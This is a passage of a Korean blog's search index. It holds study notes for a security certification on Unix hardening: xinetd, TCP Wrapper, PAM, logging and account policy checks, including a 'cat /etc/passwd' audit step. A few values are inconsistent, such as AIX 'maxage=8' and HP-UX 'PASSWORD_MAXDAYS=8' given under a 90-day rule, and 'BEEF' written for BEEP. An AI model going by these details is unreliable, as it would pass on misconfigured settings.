rwxrwxrwt                          ","categories": ["IS_Certification"],
        "tags": ["정보보안기사","UNIX"],
        "url": "https://bluesplatter.com/is_certification/IS-Unix-special_auth/",
        "teaser": null
      },{
        "title": "정보보안 - 유닉스 슈퍼데몬",
        "excerpt":"보안 쉘      원격접속의 종류            평문 송수신 (스니퍼에 노출)                    rlogin           telnet           rsh           FTP                       암호화된 송수신 (터미널)                    SSH                           수퍼데몬 xinetd      리눅스 일반 데몬은 자기자신 스스로가 직접 서비스를 함            HTTP, FTP …       백그라운드 대기하고 있다가 요청이 들어오면 자식 프로세스를 생성하여 서비스           xinetd 는 여러 서비스들을 통합관리하기 위한 것            데몬의 공통적인 기능을 제공 (요청이 들어오면 호출…)           데몬의 종류            standalone                    속도가 빠름           공통된 기능을 포함하여 중복 생성, 리소스를 많이 사용                       xinetd                    속도가 느림           공통된 기능은 xinetd 에 통합됨                           xinetd 서비스 특징            여러 서비스 (telnet, ftp) 을 통합관리하는 일종의 서비스(데몬)       각각의 서비스별로 별도의 파일에 설정 가능 (/etc/xinetd.d/*)       /etc/xinetd.conf 파일을 읽어 정보를 얻어옴. 미리 정의 필요       접근제어 요소                    timeout 설정           접속시도 횟수로 접근제어 (DoS 방지 - IP별 동시접속수 제어)           tcp_wrapper (tcpd) 을 내장 (/etc/hosts.allow, /etc/hosts.deny)                       로깅 요소                    로그파일 크기를 제한할 수 있음           xinetd 에서 제어되는 각 서비스들에 대한 syslog 로깅 레벨 설정 가능           접속하는 클라이언트들의 서비스 이용시간 기록 가능           서비스를 거부하거나 서비스 접근제어가 되었을 경우 상세로그를 기록                           etc/xinetd.conf            /etc/xinetd.d/ 디렉터리 내에 존재       xinetd 서비스파일들에 공통적으로 적용하는 설정 내용이 저장되어 있음                xinetd.conf 파일 구조                                                  service               socket_type               protocol               wait_flag               login_name               server               argument                                                               ftp               stream               tcp               nowait               root               /usr/sbin/tcpd               in.ftpd -l -a                                         telnet               stream               tcp               nowait               root               /usr/sbin/tcpd               in.telnetd                                                      service : 서비스명, 포트 번호 결정 (/etc/services 에서 서비스명 참조)           socket_type : tcp 기반 - stream, udp 기반 - datagram           protocol           wait_flag                            nowait : 서비스 요청을 받은 뒤 바로 서비스 처리               wait : 기존에 받은 요청을 모두 처리한 뒤 서비스 요청을 받음                                   login_name : 해당 프로그램을 실행하는 사용자 계정 설정           server : 실행경로                            /usr/sbin/tcpd : TCP Wrapper 사용               /usr/sbin/in.telnetd (tcpd X): TCP Wrapper 미사용                                   argument : 프로그램을 실행할 때 인수 설정                       설정 내용 변경 후 데몬 재시작 필요       보안상 취약한 서비스는 비활성화 필요                    Simple TCP 서비스 - Dos 공격에 취약                            echo               daytime               discard               chargen                                   r 계열 서비스 - 인증 없이 원격접속이 가능                            rsh               rexec               rlogin                                   rpc (remote procedure call) 서비스 - 버퍼 오버플로우 공격에 취약                            rpc.csmd               rsuersd                                   finger, tftp 등 취약한 서비스                           TCP Wrapper (접근통제)      inetd 데몬에 의해 구동되는 네트워크 서비스 (ftp, telnet, rlogin, rsh, exec, tftp, talk, systat, finger 등) 들에 대한 접근 통제와 사용된 서비스별 로그를 기록할 수 있는 보안강화 도구   시스템에 존재하는 소프트웨어나 설정 파일을 바꿀 필요가 없음   클라이언트와 서버 응용 프로그램 사이의 실질적인 통신에 부하를 주지 않음        TCP Wrapper 는 /etc/inetd.conf 에 정의되고 inetd 데몬에 의해 통제되는 네트워크 서비스를 통제하기 위하여 inetd 데몬과 네트워크 서비스데몬(in.telnetd, in.ftpd, in.rlogind 등) 사이에 tcpd 데몬을 구동하여 네트워크 서비스의 사용에 대한 접근제어와 로그 기록 기능을 함       hosts.allow / deny 파일            접근허용 / 접근차단       service_list : client_list [: shell_command] 형식                    telnet : 192.168.16.10           ALL : 192.168.16.10           ALL : ALL                       접근순서                    예시 1                            hosts.allow                                    ALL : 192.168.16.10                                               hosts.deny                                    ALL : ALL                                               192.168.16.10 은 모든 서비스를 허용하고 나머지는 모두 차단                                   예시 2                            hosts.allow                                    in.telnetd : 192.168.1.1, 192.168.1.0/255.255.255.0                   in.ftpd : test.co.kr, 192.168.1.                   ALL : LOCAL                                               hosts.deny                                    ALL : ALL                                               지정된 서비스, IP 는 허용, 나머지는 모두 차단               test.co.kr 도메인에 해당하는 모든 IP               서브넷 마스크 사용 가능 (192.168.1.0/255.255.255.0) = 192.168.1.               LOCAL : 같은 네트워크에 있는 모든 호스트                                               : shell_command : 주로 hosts.deny 와 연계하여 사용, 즉시통보, 경고메시지                    twist : shell_command 명령의 결과를 클라이언트에게 전송           spawn : 메일을 보낼 때 사용           banners : 특정 디렉터리 내의 문서(데몬명과 동일제목)를 클라이언트에게 출력           예시                            hosts.deny                                    in.telnetd : 203.241.200.97 : twist /bin/echo “not allowed”                                               hosts.deny                                    in.telnetd : 203.205.205.91 : spawn /bin/mail -s “%a is denied”                                            %a : TCP Wrapper 환경변수 (client IP 주소)                                                    %a : 클라이언트 IP 주소                           %c : 클라이언트 정보 (user@호스트명 or IP주소)                           %d : 데몬 프로세스명                           %h : 클라이언트 호스트명 or IP 주소                           %n : 클라이언트 호스트명 or unknown                           %p : 데몬의 PID                           %s : 서버정보 (데몬명@호스트명)                           %u : 클라이언트 사용자 이름                                                                       설정한 제목으로 메일을 보냄                                                                                                                           로그 기록            syslogd 사용       telnet, ftp, rexec, rsh, rlogin, tftp, talk 등에 대한 접근로그 기록       /var/log/syslog 파일에 저장 - 변경하려면 /etc/syslog.conf 파일 수정           xinetd 접속 설정            /etc/xinetd.conf : 글로벌 (Default) 설정                    cps : (connection per second) - 초당 연결 수                            cps = 30 10                                    30 : 초당 연결 제한 수                   10 : 초당 연결 수 초과 시 대기(중지) 시간                                                                   instances : 동시에 서비스할 수 있는 서버의 최대 개수                            instances = 100                                    동시에 서비스할 수 있는 최대 서버 수 100 개                                                                   per_source : 출발지 IP 주소 기준 서비스 최대 연결 수                            per_source = 10                                    동일 IP에서 최대 연결 수를 10개로 제한                                                                   설정 변경 후 서비스 재가동                            service xinetd restart               service network restart                                               /etc/xinetd.d/서비스설정파일 : 각각의 서비스별 설정             service telnet   {       flags       = REUSE       socket_type = stream       wait        = no       user        = root       server      = /usr/sbin/in.telnetd       log_on_failure += USERID       disable     = no       only_from   = 192.168.0.0/16       no_access   = 192.168.1.137/32 192.168.1.130       access_times = 09:00-22:00 23:00-01:00   }             * flags : 더이상 사용하지 않음 (inetd 에서는 사용) - 호환성을 위함   * socket_type : TCP 인 경우 stream, UDP 인 경우 datagram   * wait : 요청에 대해 즉시 처리 / 이전요청 처리후 처리 여부   * user : 서비스를 어떤 사용자로 실행할 것인지   * server : 서비스 실행파일 경로   * log_on_failure : 서버에 접속 실패했을 경우 로그 파일에 기록할 내용       - USERID : 원격접속 사용자 ID       - PID : xinetd 프로세스 ID       - HOST : 원격 HOST IP       - EXIT : 프로세스 종료 상태       - DURATION : 서버 세션 지속시간   * log_on_success : 서버에 접속 성공했을 경우 로그 파일에 기록할 내용   * disable : 해당 서비스 실행여부       - no : 실행       - yes : 실행안함   * only_from : 특정 주소(대역) 만 접근 허용   * no_access : 특정 주소(대역) 의 접근 차단   * access-times : 접근허용 시간           접근 차단 로그            /var/log/message 확인       cat /var/log/message | grep xinetd | grep FAIL          ","categories": ["IS_Certification"],
        "tags": ["정보보안기사","UNIX"],
        "url": "https://bluesplatter.com/is_certification/IS-Unix-superdaemon/",
        "teaser": null
      },{
        "title": "정보보안 - 유닉스 PAM",
        "excerpt":"PAM      PAM(Pluggable Authentication Module : 탈착형 인증 모듈)            개요                    사용자를 인증           서비스에 대한 액세스를 제어하는 라이브러리           권한을 부여하는 소프트웨어의 개발과 안전하고 적정한 인증의 개발을 분리           로그인, telnet, ftp 등의 프로그램 사용시 PAM 을 이용                       절차                    각종 프로그램 (로그인, telnet, ftp 등) 에서 PAM 라이브러리 호출           PAM 라이브러리에서 사용자 인증, 결과값 전송                       구성파일                    /etc/pam.d 디렉터리 내에 있는 서비스에서 PAM을 사용           /etc/pam.d/other : /etc/pam.d 디렉터리 외부에서 PAM을 사용할 경우                       기본 구조                    cat /etc/pam.d/login : remote 서비스                                                          type               control               module-path               module-arguments                                                               auth               required               /lib/security/pam_securetty.so                                                         account               required               /lib/security/pam_stack.so               service=system-auth                                         password               required               /lib/security/pam_stack.so               service=system-auth                                         session               required               /lib/security/pam_stack.so               service=system-auth                                         session               optional               /lib/security/pam_console.so                                                                      type : PAM 모듈의 종류                            account : 사용자의 시스템 사용 권한을 확인하는 모듈               auth : 패스워드 확인 등 실질적인 인증기능을 하는 모듈               password : 패스워드 설정, 패스워드 확인 모듈               session : 인증 성공시 세션을 연결시켜 주는 모듈                                   control : 모듈 성공/실패에 따른 라이브러리 동작 결정                            requisite : 실패했을 경우 즉시 인증 거부               required : 인증이 실패하더라도 다음 라인 수행, 최종적으론 인증 실패               sufficient                                    이전 요청 모듈이 실패하더라도 현재 성공시 PAM 인증승인                   실패할 경우 다음 라인 수행                                               optional : 거의 사용하지 않음 (모듈의 성공/실패와 연관없음)               include : 모듈이 아닌 PAM 파일의 결과를 사용                                   module-path : 실제 모듈 파일 경로                            /lib/security/*.so                                   module-arguments : 모듈 전달 인수값                       지원 모듈 목록                    pam_securetty.so                            /etc/securetty 터미널을 사용하는 경우 root 원격 접속 허용               허용할 터미널만을 기재               원칙 : root 계정은 콘솔로 연결해야 함                                   pam_listfile.so                            /etc/pam.d/vsftpd ftp 허용/거부 관련                                   pam_nologin.so                            /etc/nologin 파일이 있으면 root 로만 로그인 가능                                   pam_deny.so           pam_cracklib.so                            사전에 등록된 단어를 이용한 공격(사전공격) 차단을 방지                                   pam_wheel.so                            /etc/pam.d/su 와 연계하여 사용               root 권한을 얻을 수 있는 그룹                                   pam_rootok.so                            UID : 0 인 사용자를 인증하는 모듈               root 가 암호입력 없이 서비스를 사용하는 것을 지원                                   pam_tally.so                            로그인 시도횟수를 세는 모듈                                   pam_limits.so                            시스템 자원에 대한 사용자 제한을 설정하는 모듈                                                   PAM 사용 예            /etc/pam.d/login(remote) 파일 열기                    한단계 씩 진행           #PAM-1.0 : 주석절           auth required pam_securetty.so                            auth : 인증기능 모듈               pam_securetty.so : /etc/securetty 에 리스팅되어 있는 터미널을 제외한 나머지는 root 접속 실패                                   auth required pam_unix.so nullok                            pam_unix.so : /etc/passwd, /etc/shadow 를 이용한 인증               nullok : null password 허용                                   auth required pam_nologin.so                            pam_nologin.so : /etc/nologin 파일 여부 체크, 있으면 root 제외한 모든 사용자 접속 차단                                   account required pam_unix.so                            account : 사용자의 시스템 자원 권한 확인               pam_unix.so : account 인터페이스를 사용할 경우 유저 계정 활성화여부, 비밀번호 만료여부 등을 확인                                   password required pam_cracklib.so retry=3                            pam-cracklib.so : 패스워드 변경 시 취약한 패스워드인지 확인 / 차단                                   password required pam_unix.so shadow nullok                            PAM 사용 서비스에서 패스워드 변경 시 shadow, null ok                                                   /etc/securetty            pam_securetty.so 모듈이 사용하는 파일       원격 root 접속을 허용할 터미널을 기록                    tty10 : 서버와 연결된 키보드를 통해서 콘솔로 직접 로그인한 터미널           tty11           tty9                        pty/10 : 가상터미널 (원격접속) - telnet, ssh 등. 주석처리 - 불가                                    pty/11 : 주석처리 - 불가                                   /etc/pam.d/remote (혹은 login)                    auth required pam_securetty.so                           OS 기종별 root 원격접속 제어            SunOS                    /etc/default/login : root에 대한 원격접속 등                            console = /dev/console : 콘솔에서만 root 접속 가능                                               HP-UX                    /etc/securetty                            console : 콘솔에서만 root 접속 가능                                               AIX                    /etc/security/user                            rlogin=false : 콘솔에서만 root 접속 가능                                               Linux                    /etc/securetty 에서 설정                           pam_tally.so -&gt; pam_tally2.so            계정 잠금 임게값 설정                    5회 초과 시 Password Lock                       패스워드 공격에 대한 방어                    무작위/무차별 공격 (Brute force)           사전 공격 (Dictionary Attack)                       /etc/pam.d/system_auth 파일에 추가                    auth required pam_tally2.so deny=5 unlock_time=120;                            deny=5 : 5번 실패시 잠금               unlock_time=120 : 2분간 잠금                                   /var/log/secure : 실패로그 저장위치           user1 이 로그인 횟수 5회 초과시 확인 방법                            #pam_tally2 -u [계정명] : 결과값 확인                                    결과값 : user1 6 시간값 IP주소값                                               #pam_tally -u [계정명] -r : 횟수 리셋                                                   OS 별 계정 잠금 임계값 설정            SunOS                    /etc/security/policy.conf : LOCK_AFTER_RETRIES=YES &gt; 잠금설정           /etc/default/login : RETRIES=5 &gt; 횟수설정                       HP-UX                    /tcb/files/auth/system/default : u_maxtries#5                       AIX                    /etc/security/user : logintries=5                       LINUX                    /etc/pam.d/system_auth                            auth required /lib/security/pam_tally.so deny=5 unlock_time=120 no_magic_root : no_magic_root &gt; root 패스워드 잠금 X                                                   su 명령            /etc/pam.d/su                    auth sufficient pam_rootok.so           auth include system_auth : 다른 PAM 파일에 대한 결과 사용                       root 가 타 사용자로 변환할 경우 -&gt; 패스워드 확인 X       일반사용자가 타 일반사용자 혹은 root 로 변환 -&gt; 패스워드 확인 O          ","categories": ["IS_Certification"],
        "tags": ["정보보안기사","UNIX"],
        "url": "https://bluesplatter.com/is_certification/IS-Unix-PAM/",
        "teaser": null
      },{
        "title": "정보보안 - 유닉스 로그",
        "excerpt":"로그관리      윈도우 : 중앙에서 집중적으로 로그 수집, 저장            관리 쉬움       공격에 치명적           유닉스 : syslogd (중앙 관리 데몬) 가 있으나, 서비스 데몬들이 산발적으로 저장            관리 어려움                    syslogd           maild           httpd           xinetd                       공격에 강함           OS에 따른 차이            초기 유닉스 BSD 계열 : /usr/adm                    HP-UX 9.X           SunOS 4.X                       최근 유닉스 SVR 계열 : /var/adm                    솔라리스           HP-UX 10.X 이후           AIX                       일부 BSD 계열 : /var/log                    BSD           FreeBSD           오라클 솔라리스           리눅스                       일부 리눅스 : /var/run           로그관리            /var/log 디렉토리에서 시스템의 로그를 기록/관리       /etc/syslog.conf 파일에서 로그파일 위치 지정       로그 시스템 흐름                    init 데몬 -&gt; syslogd 실행 -&gt; /var/log 디렉토리 지정된 파일에 로그 기록 -&gt; crond에 의한 주기적인 logrotated 데몬 실행                       로그파일                    /var/log/dmesg : 부팅될 당시에 각종 메시지들을 저장                            텍스트 형식               dmesg -c : 모든 메시지 삭제, 새로운 로그 기록               dmesg -k : 커널 메시지 출력               dmesg | grep [hda|sda] : 하드디스크 관련 정보 출력               dmesg | grep eth : NIC 정보               dmesg | grep usb                                   /var/log/cron : crond 데몬 로그파일                            crond 가 동작하면서 실행한 프로세스, 응용프로그램에 대한 정보               /var/run/crond.pid 에 실행중인 crond 의 pid 저장               /etc/cron.[hourly|daily|weekly|monthly]/*                                    주기별로 실행할 스크립트 파일이 존재                                                                   /var/log/message : 모든 데몬의 시스템 로그                            텍스트 형식               시스템의 가장 기본적인 시스템 로그 파일               시스템관리자가 중요하게 다루는 파일                                    TCP Wrapper의 접근 제어 정보 - xinetd : …                   사용자 접속 정보                   시스템 데몬 실행 내역                                               형태 : timestamp / 호스트명 / 데몬명 / 메시지 내용                                   /var/log/secure : 보안인증 관련 메시지                            사용자/그룹 생성, 삭제               사용자 인증, PW 변경               원격접속 내역               su (switch user) 명령 수행 내역                                   /var/log/xferlog : ftp(proftpd, vsftpd) 로그                            Fri Nov 8 12:33:43 2013 1 61.75.198.144 36 /Q00/mac.txt b _ o a chrome@example.com ftp 0 * c                                    Fri Nov 8 12:33:43 2013 : current_time                   1 : transfer_time (초단위) - 전송시간                   61.75.198.144 : remote host                   36 : file_size (kb)                   /Q00/mac.txt : file_name                   b : transfer_type (전송파일 종류)                                            a : ascii                       b : binary                                                           _ : special action_flag (FTP 서비스 내 행동)                                            _ : no action                       c : 압축                       u : 압축하지 않음                       t : tar (묶여있는 파일)                                                           o : direction (전송방향)                                            i : incoming (서버로 들어오는 것 - 업로드)                       o : outgoing (서버에서 나가는 것 - 다운로드)                       d : delete                                                           a : access mode (사용자 접근 방식)                                            a : anonymous (익명성)                       r : real (인증)                                                           chrome@example.com : user_name (로그인한 사용자명)                   ftp : service name (서비스명)                   0 : 사용자 인증 방법                                            0 : none (인증방법 없음)                       1 : RFC931 (인증있음)                                                           * : 인증을 통해 리턴된 사용자 ID                                                                                                : 인증 성공                                                                       : 인증 실패                                                           c : 파일 전송 상태                                            c : Complete                       i : Incomplete                                                                                                           /var/log/maillog : sendmail, pop 등의 메일관련 데몬 로그           /var/spool/mail : 디렉터리, ID 와 동일한 파일이 저장됨                            mail 명령어로 확인, &amp;[숫자] 로 메일에 접근                                               기타 로그파일                    /var/log/wtmp : 시스템 전체 로그인 기록을 저장                            사용자의 성공한 로그인/로그아웃 정보               시스템의 Boot, Shutdown 정보               binary 파일, last 명령어로 확인 : 모든 계정 로그인/로그아웃 정보               유닉스(SunOS) : /var/adm/wtmpx               리눅스 : /var/log/wtmp               확인 시 last [계정명]                                   /var/log/utmp : 현재 로그인 사용자에 대한 기록, 사용자 IP 저장                            binary 파일 형태               확인 시 w, who, finger 명령어 사용                                                         w [유저명]                                                                                                  USER                           TTY                           FROM                           LOGIN@                           IDLE                           JCPU                           PCPU                           WHAT                                                                                                                           root                           tty1                           -                           23:24                           0.00s                           0.31s                           0.02s                           w                                                                                                                  USER : 유저 계정                       TTY : 터미널 (TTY-콘솔, PTS- xwindows 가상 콘솔, PTY - 외부연결 가상 콘솔)                       FROM : 접속위치                       LOGIN@ : 로그인한 시간                       IDLE : 유휴시간 (입력 X)                       JCPU                       PCPU                       WHAT : 수행하고 있는 작업명령어                                                                                who [유저명] : USER, TTY, LOGIN@                                                                   유닉스(SunOS) : /var/adm/utmpx               일부 리눅스 : /var/run/utmp                                   /var/log/lastlog : 가장 최근에 로그인 성공한 기록                            binary 파일               확인 시 lastlog (리눅스), finger (리눅스, 유닉스)                                    lastlog -u 계정명                   lastlog -t 일수                   finger 계정명 : 해당 계정의 마지막 로그인 정보                                               유닉스(SunOS) : /var/adm/lastlog               리눅스 : /var/log/lastlog                                   /var/log/btmp : 실패한 로그인 시도 기록                            리눅스 : btmp - /var/log/btmp (binary)                                    lastb 명령으로 확인                                               유닉스 : loginlog - /var/adm/loginlog (text)                                    vi 또는 cat 으로 확인                   5회 이상 실패시 기록을 남김                                                                   /etc/init.d/acct -&gt; /var/adm/pacct : accounting (통계)                            사용자가 로그인~로그아웃 동안 입력한 명령어 내역               binary 형태 파일               lastcomm, acctcom 으로 확인                                    lastcomm [계정명]                   내용 : 명령어, 플래그, 사용자명, 터미널, 프로세스 시작시간                                            플래그                                                    F (fork 에 의해 수행)                           S (superuser)                           X (SIGTERM 종료)                                                                                                                                       명령어로 초기 로그파일 생성 (자동생성 X)                                    리눅스 : accton /var/account/pacct                   유닉스 : accton /var/adm/pacct                   free BSD                                            생성 : touch /var/account/acct                       실행 : /usr/sbin/accton /var/account/acct                                                           명령어 경로                                            유닉스, SunOS, HP : /usr/lib/acct/accton                       리눅스 : /sbin/accton                       SunOS : /sbin/acct.sh                                                                                       파일경로                                    유닉스 : /var/adm/pacct                   리눅스 : /var/account/pacct                                                                   /$HOME/.bash_history : .쉘이름_history, 계정별 실행 명령                            텍스트 형태 파일               history 명령어로 확인 가능                                   /var/adm/sulog : 유닉스 로그파일, 리눅스는 secure 파일에 저장                            텍스트 형태 파일               형태 : su 시간 + pts/5 test-root                                    + : 성공 (+) / 실패 (-)                   test-root : test 계정에서 root 계정으로 시도                                                                   /var/log/boot.log : 리눅스에서 부팅될 때 성공/실패 여부 표시                            파일시스템 체크               서비스데몬 실행상태                                                   /etc/syslog.conf 파일 분석            syslogd : syslog 표준 api에 의해서 로그 생성, 관리       syslogd 는 운영체제에 의해 자동 시작되며 syslog.conf 파일을 참조       syslog 표준 api를 준용해 구현한 Application 은 syslogd 에 의해 로그 기록       syslog 는 기밀성, 무결성, 가용성을 고려하지 않고 개발됨                    UDP 프로토콜로 원격지 전송 시 스니핑 가능성           보완책 (RFC3195) : rsyslog                            TCP 이용 : 로그 전송의 신뢰성 보장               syslog msg 의 기밀성 보장을 위해 syslog 서버와 로그수집 대상 서버의 IP를 제외한 payload 보호를 위해 BEEF 사용 권고                                    the Blocks Extensible Exchange Protocol                   연결지향적, 신뢰성 보장 프로토콜 (내부인증, 재전송)                   응용프로그램 프로토콜 Framework                                                                               기본 구성 형식                    facility.priority; facility.priority; ... action(logfile location)                            서비스데몬(facility) 에 대해서 로그레벨(priority) 로 기록                                   selector field(선택자 필드) : 어떤 것을 기록할 것인지를 설정                            메시지 종류(facility)                                    * : 모든 서비스를 의미                   auth : login과 같이 인증프로그램 유형이 발생한 메시지                   authpriv : 개인 인증을 요하는 프로그램 유형이 발생한 메시지                   cron : cron, at 과 같은 프로그램이 발생한 메시지                   daemon : telnetd, ftpd와 같이 daemon이 발생한 메시지                   kern : 커널이 발생한 메시지                   lpr : 프린터 유형의 프로그램이 발생한 메시지                   mail : mail 시스템이 발생한 메시지                   mark : syslogd 에 의해 만들어지는 날짜 유형 메시지                   news : 유즈넷 뉴스 프로그램 유형이 발생한 메시지                   syslog : syslogd 에서 발생한 메시지                   user : 사용자 프로세스                   uucp : UUCP 시스템이 발생한 메시지                                            unix-to-unix copy protocol                       유닉스 시스템을 연결하는 광역 연결망                                                           local0 ~ loacl7 : 여분으로 남겨둔 유형(시스템부팅 메시지 기록)                                               메시지 우선 순위(priority)                                    * : 발생하는 모든 상황에 대한 메시지                   debug : 프로그램을 디버깅할 때 발생하는 메시지                   info : 통계, 기본정보 메시지                   notice : 특별한 주의를 요하나 에러는 아닌 메시지 (관리자조치필요)                   warning : 주의를 요하는 경고 메시지                   err : 에러가 발생하는 경우의 메시지                   crit : 크게 급하지는 않지만 시스템에 문제가 생기는 단계의 메시지                   alert: 즉각적인 조정을 해야 하는 상황 (예:DB 오류)                   emerg : 모든 사용자에게 전달되어야 할 위험한 상황 (예:시스템중지)                   none : 어떠한 경우라도 메시지를 저장하지 않음                                                                   action field(액션 필드) : 어느파일에 로그를 기록할 것인지를 설정                            콘솔, 파일명, 사용자 또는 원격시스템               file : 해당 file 에 내용을 추가                                    /var/log/secure                   콘솔 : /dev/console                                               @host : 지정된 호스트로 메시지를 보냄                                    원격로그서버. @호스트주소 (예:@192.168.190.10)                                               user : 지정된 사용자의 스크린으로 메시지를 보냄 (예:root)               * : 현재 로그인되어 있는 모든 사용자의 스크린으로 메시지를 보냄                                                   syslog.conf(rsyslog.conf) 설정            *.alert; kern.err; daemon.err; operator                    모든 서비스의 alert 이상 로그는 operator 계정으로 출력           커널의 error 이상 로그는 operator 계정으로 출력           데몬의 error 이상 로그는 operator 계정으로 출력                       kern.* /dev/console                    커널의 모든 로그는 콘솔에 출력                       *.info; mail.none; authpriv.none; cron.none /var/log/messages                    모든 서비스의 info 이상 로그는 /var/log/messages 에 로그 기록           mail, authpriv, cron 서비스의 로그는 기록하지 않음           /var/log/messages 파일이 존재하지 않는 경우 새로 생성하지 않음                       authpriv.* /var/log/secure                    xinetd, tcp_wrapper, ftp, telnet, finger … 등의 서비스의 모든 수준 로그는 /var/log/secure 에 로그 기록                       mail.* /var/log/maillog                    메일서비스(sendmail, ipop, imap, qmail) 서비스의 모든 수준 로그는 /var/log/maillog 에 로그 기록                       cron.* /var/log/cron                    crond, atd 의 모든 수준 로그는 /var/log/cron 에 로그 기록                       *.emerg *                    모든 서비스의 emerg 수준의 로그는 모든 사용자에게 전송                       uucp,news.crit /var/log/spooler                    uucp, news 서비스의 crit 수준 이상의 로그는 /var/log/spooler 에 기록                       local7.* /var/log/boot.log                    시스템 부팅 시 모든 로그는 /var/log/boot.log 에 기록                       적용 시 rsyslogd 데몬 재시작 필요           실시간으로 로그 보기            tail [option] ... [file] ... : 텍스트 파일 형식의 로그파일 확인       tail -f /var/log/secure : 파일의 마지막 10라인을 실시간으로 계속 출력           Logrotate 리눅스 로그 순환 관리            syslog 나 데몬프로세스가 출력하는 로그파일을 그대로 방치하면 사이즈가 커지면서 관리하기 어려워지고 디스크 사용률이 100% 가 되어 시스템 장애가 발생할 수 있음       logrotate 는 리눅스 설치시 패키지형태로 기본적으로 설치되는 시스템 로그파일 관리도구, 로그파일 순환, 압축 등의 기능을 가지고 있음       경로 : /usr/sbin/logrotate       설정파일 : /etc/logrotate.conf                    순환주기 : daily, weekly, monthly           로그파일의 순환 개수 : rotate n           압축여부 : compress, uncompress           로그파일의 순환 사이즈 지정 : size n           확장자에 날짜를 붙여 저장 : dateext                       설정디렉토리 : /etc/logrotate.d logrotate 를 적용하기 위한 프로세스, 데몬에 관련된 설정파일       상황파일 : /var/lib/logrotate.status logrotate 의 작업내역이 보관됨       cron : /etc/cron.daily/logrotate 주기적으로 실행되어야 할 내용           아파치 웹서버 로그     액세스 로그 (접속 로그)            /var/log/httpd/access_log           에러 로그            CentOS : /var/log/httpd/error_log       우분투 : /var/log/apache2/error.log           로그 포맷            httpd.conf 파일에 기록       CLF(Common Log Format)                    LogFormat \" %h %l %u %t \\ \" %r\\ \" %&gt;s %b \" common                            %h : Host (클라이언트 호스트명, IP Address)               %H : 요청 프로토콜의 종류               %I : Ident (아이덴티티 체크), 클라이언트 로그인명                                    대부분 - 로 표기 (신뢰할 수 없는 item)                                               %u : Auth user (클라이언트 사용자명)                                    대부분 - 로 표기 (신뢰할 수 없는 item)                                               %U : 요청된 경로 (자료의 경우 r을 사용)               %t : time (접속시간, 날짜)               %T : 웹서버가 요청을 처리하는데 걸린 시간               %r : request (HTTP 접근 방식, Client가 요청한 자료, HTTP 버전)               %c : 응답이 완료 되었을 때 연결상태                                    x : 응답완료 전 연결 끊김                   + : 응답완료 후 연결 지속                   - : 응답완료 후 연결 끊김                                               %s : status (요청에 대한 서버처리 상태코드)               %b : bytes (서버에서 클라이언트로 전송한 데이터크기)               %i : 클라이언트의 웹브라우저 정보                                    LogFormat \"{user-agent}i\" agent                   LogFormat \"{Referer}i-&gt;%U\" referer : 현재 아파치서버에 접속하기 전에 있었던 URL 을 기록                                                                   웹 서버 로그 예                            203.251.189.47 - - [03/Aug/2000:21:56:55 +0900] \"GET /doc/images/sub.gif HTTP/1.1\" 200 6083                                               CustomLog                    LogFormat \" %h %l %u %t \\\"%r\\\" %&gt;s %b \\\"%{Referer}i\\\" \\\"%{user-agent}i\\\"\" combined                          ","categories": ["IS_Certification"],
        "tags": ["정보보안기사","UNIX"],
        "url": "https://bluesplatter.com/is_certification/IS-Unix-log/",
        "teaser": null
      },{
        "title": "정보보안 - 유닉스 서버 취약점",
        "excerpt":"유닉스 서버 취약점 - 계정 관리      계정관리            패스워드 복잡성 설정                    영문, 숫자, 특수문자가 혼합된 8자리 이상 패스워드가 설정되어야 함           주의사항                            사전에 등록된 정보               Null 패스워드               연속된 캐릭터 조합               계정에서 유추 가능                                               OS 별 점검 파일 위치 및 점검 방법                    SunOS, linux : /etc/shadow                            shadow 파일의 존재 확인               /etc/passwd 파일의 두 번째 필드 ‘x’ 값 확인                                    pwconv : shadow 패스워드 적용                   pwunconv : 일반 패스워드 적용                                                                   HP-UX  : /etc/shadow                            /tcb 디렉터리 존재 확인                                    trusted mode 일 경우 /tcb/files/auth 디렉터리 내 계정이니셜, 이름에 따라서 파일 저장관리, /etc/shadow 는 접근불가                   trusted mode 인지 확인 (PW 암호화 저장)                                            trusted mode / untrusted mode                       trusted mode 로 전환 : #/etc/tsconvert                       untrusted mode 로 전환 : #/etc/tsconvert -r                                                                                       /etc/passwd 파일의 두 번째 필드 ‘x’ 값 확인                                   AIX : /etc/security/passwd                       패스워드 파일 보호                    패스워드를 암호화하여 저장해야 함. /etc/shadow                       UID 확인                    Root 계정과 동일한 UID (0) 금지           사용자 간 UID 중복 건이 있는지 검사 (감사 추적 어려움)                       OS 별 점검 파일 위치 및 점검 방법                    SunOS, linux, AIX, HP-UX                            #cat /etc/passwd               root:x:0:0:root:/root:/bin/bash               …                                   SunOS, linux, HP-UX                            usermod 명령으로 수정                                    UID 0인 일반 계정의 UID 수정                                            SunOS, HP-UX : 100 이상                       linux : 500 이상                                                           usermod -u 100 test                                                                   AIX                            chuser 명령으로 수정                                    chuser id=1001 test                                                                               패스워드 최소 길이 설정                    패스워드 최소 길이가 8자 이상으로 설정되어야 함                       OS 별 점검 파일 위치 및 점검 방법                    SunOS                            #cat /etc/default/passwd               PASSLENGTH=8                                   Linux                            #cat /etc/login.defs               PASS_MIN_LEN 8                                   AIX                            #cat /etc/security/user               minlen=8                                   HP-UX                            #cat /etc/default/security               MIN_PASSWORD_LENGTH=8                                               패스워드 최대 사용기간 설정                    패스워드 최대 사용기간이 90일 이하로 설정되어야 함                       OS 별 점검 파일 위치 및 점검 방법                    SunOS                            #cat /etc/default/passwd               MAXWEEKS=12                                   Linux                            #cat /etc/login.defs               PASS_MAX_DAYS 90                                   AIX                            #cat /etc/security/user               maxage=8                                   HP-UX                            #cat /etc/default/security               PASSWORD_MAXDAYS=8                                               패스워드 최소 사용기간 설정                    패스워드 최소 사용기간이 1일로 설정되어야 함                       OS 별 점검 파일 위치 및 점검 방법                    SunOS                            #cat /etc/default/passwd               MINWEEKS=1                                   Linux                            #cat /etc/login.defs               PASS_MIN_DAYS 1                                   AIX                            #cat /etc/security/user               minage=1                                   HP-UX                            #cat /etc/default/security               PASSWORD_MINDAYS=1                                                   파일 및 디렉터리 관리      root 홈, 패스 디렉터리 권한 및 패스 설정            root 계정 PATH 환경변수에 . 이 맨 앞이나 중간에 포함되지 않은 경우 양호       예 : 악의적인 사용자가 /bin/ps 명령어보다 우선 실행될 수 있도록 ps 로 악성코드를 심어놓음.       ~/.profile 혹은 /etc/profile                    PATH = .:$PATH:$HOME/bin : . 제거 필요                       #echo $PATH                    /usr/local/sbin:/sbin:......:/usr/local/bin           . 또는 :: 포함 여부 확인 필요                           파일 및 디렉터리 소유자 설정            소유자가 존재하지 